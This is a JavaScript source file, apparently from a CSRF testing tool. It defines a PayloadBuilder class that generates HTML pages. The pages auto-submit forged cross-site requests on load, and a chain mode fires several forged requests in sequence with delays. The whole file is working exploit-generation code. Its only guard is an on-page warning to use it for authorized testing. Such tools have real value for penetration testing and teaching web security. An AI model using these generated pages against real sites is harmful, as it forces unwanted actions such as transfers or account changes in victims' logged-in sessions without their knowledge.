/**
 * Payload Builder
 * Builds the complete HTML payload for CSRF attacks
 */

const utils = require('./utils');

class PayloadBuilder {
  constructor(options = {}) {
    this.options = options;
  }

  /**
   * Build a complete HTML document containing the CSRF payload
   * @param {Object} params - Build parameters
   * @returns {string} - Complete HTML document
   */
  build(params) {
    const {
      template,
      title = 'CSRF Test',
      autoSubmit = true,
      delay = 0,
      chainMode = false
    } = params;

    // Create a unique form ID if needed
    const formId = params.formId || `csrf-form-${Date.now()}-${Math.floor(Math.random() * 1000)}`;

    // If in chain mode, only return the template content
    if (chainMode) {
      return template;
    }

    // Build the complete HTML document
    return `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${utils.escapeHtml(title)}</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            padding: 20px;
            max-width: 800px;
            margin: 0 auto;
        }
        .container {
            border: 1px solid #ddd;
            padding: 20px;
            border-radius: 5px;
        }
        .instructions {
            margin-bottom: 20px;
            padding: 10px;
            background-color: #f8f9fa;
            border-left: 4px solid #007bff;
        }
        button {
            padding: 10px 15px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0069d9;
        }
        .code {
            font-family: monospace;
            white-space: pre-wrap;
            background-color: #f8f9fa;
            padding: 10px;
            overflow: auto;
            border-radius: 4px;
        }
        .hidden {
            display: none;
        }
        .warning {
            background-color: #fff3cd;
            color: #856404;
            padding: 10px;
            margin-bottom: 20px;
            border-radius: 4px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="warning">
            <strong>WARNING:</strong> This page contains a CSRF test payload. Only use for ethical security testing with proper authorization.
        </div>
        <div class="instructions">
            <h2>CSRF Test Payload</h2>
            <p>This page contains a Cross-Site Request Forgery (CSRF) test payload targeting:</p>
            <p class="code">${utils.escapeHtml(params.url || '')}</p>
            ${autoSubmit 
              ? `<p>The form will be automatically submitted ${delay > 0 ? `after a delay of ${delay}ms` : 'immediately'}.</p>` 
              : '<p>Click the button below to submit the form and test for CSRF vulnerability.</p>'}
        </div>
        
        <div id="payload-container">
            ${template}
        </div>
        
        ${!autoSubmit ? `<button type="button" onclick="document.getElementById('${formId}').submit()">Submit CSRF Test</button>` : ''}
        
        <div class="instructions">
            <h3>Technical Details</h3>
            <p>Method: ${params.method || 'POST'}</p>
            <p>Request Type: ${params.requestType || 'form'}</p>
        </div>
    </div>
    
    ${autoSubmit && !chainMode ? `
    <script>
        window.onload = function() {
            setTimeout(function() {
                ${params.requestType === 'form' 
                  ? `document.getElementById('${formId}').submit();` 
                  : `document.getElementById('${formId}').click();`}
                console.log('CSRF payload automatically submitted');
            }, ${delay});
        };
    </script>` : ''}
</body>
</html>`;
  }

  /**
   * Build a chained CSRF attack with multiple requests
   * @param {Array<string>} payloads - Individual payload templates
   * @param {Array<Object>} requestChain - Original request parameters
   * @returns {string} - Complete HTML with chained requests
   */
  buildChain(payloads, requestChain) {
    // Create a unique ID for each request in the chain
    const requestIds = requestChain.map((_, index) => 
      `csrf-req-${Date.now()}-${index}`
    );
    
    // Build the chain execution script
    const chainScript = `
    <script>
        // Function to execute the request chain in sequence
        async function executeRequestChain() {
            console.log('Starting CSRF request chain execution');
            
            ${requestChain.map((req, index) => {
              // For the last request in the chain
              if (index === requestChain.length - 1) {
                return `
                // Request ${index + 1} (Final): ${req.url}
                console.log('Executing request ${index + 1} (Final)');
                ${req.requestType === 'form' 
                  ? `document.getElementById('${requestIds[index]}').submit();` 
                  : `document.getElementById('${requestIds[index]}').click();`}
                console.log('All requests in chain completed');`;
              } 
              
              // For all other requests in the chain
              return `
              // Request ${index + 1}: ${req.url}
              console.log('Executing request ${index + 1}');
              ${req.requestType === 'form' 
                ? `document.getElementById('${requestIds[index]}').submit();` 
                : `document.getElementById('${requestIds[index]}').click();`}
              
              // Wait for the specified delay before the next request
              await new Promise(resolve => setTimeout(resolve, ${req.chainDelay || 1000}));`;
            }).join('\n')}
        }
        
        // Execute the chain when the page loads
        window.onload = function() {
            setTimeout(executeRequestChain, 500);
        };
    </script>`;
    
    // Modify each payload to include the correct ID
    const modifiedPayloads = payloads.map((payload, index) => {
      return payload.replace('csrf-form-', requestIds[index]);
    });
    
    // Build the complete HTML
    return `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF Chain Test</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            padding: 20px;
            max-width: 800px;
            margin: 0 auto;
        }
        .container {
            border: 1px solid #ddd;
            padding: 20px;
            border-radius: 5px;
        }
        .instructions {
            margin-bottom: 20px;
            padding: 10px;
            background-color: #f8f9fa;
            border-left: 4px solid #007bff;
        }
        .hidden {
            display: none;
        }
        .warning {
            background-color: #fff3cd;
            color: #856404;
            padding: 10px;
            margin-bottom: 20px;
            border-radius: 4px;
        }
        .request-container {
            margin-bottom: 15px;
            padding: 10px;
            border: 1px dashed #ccc;
            border-radius: 4px;
        }
        .request-title {
            font-weight: bold;
            margin-bottom: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="warning">
            <strong>WARNING:</strong> This page contains a chained CSRF test payload. Only use for ethical security testing with proper authorization.
        </div>
        
        <div class="instructions">
            <h2>CSRF Chain Test</h2>
            <p>This page contains a chain of ${requestChain.length} CSRF requests that will be executed in sequence.</p>
            <p>The chain will be automatically executed when the page loads.</p>
        </div>
        
        <div id="requests-container">
            ${requestChain.map((req, index) => `
                <div class="request-container">
                    <div class="request-title">Request ${index + 1}: ${utils.escapeHtml(req.method || 'POST')} to ${utils.escapeHtml(req.url || '')}</div>
                    ${modifiedPayloads[index]}
                </div>
            `).join('\n')}
        </div>
        
        <div class="instructions">
            <h3>Chain Execution Order</h3>
            <ol>
                ${requestChain.map((req, index) => `
                    <li>
                        ${utils.escapeHtml(req.method || 'POST')} to ${utils.escapeHtml(req.url || '')}
                        ${index < requestChain.length - 1 ? `(Wait ${req.chainDelay || 1000}ms)` : ''}
                    </li>
                `).join('\n')}
            </ol>
        </div>
    </div>
    
    ${chainScript}
</body>
</html>`;
  }
}

module.exports = PayloadBuilder;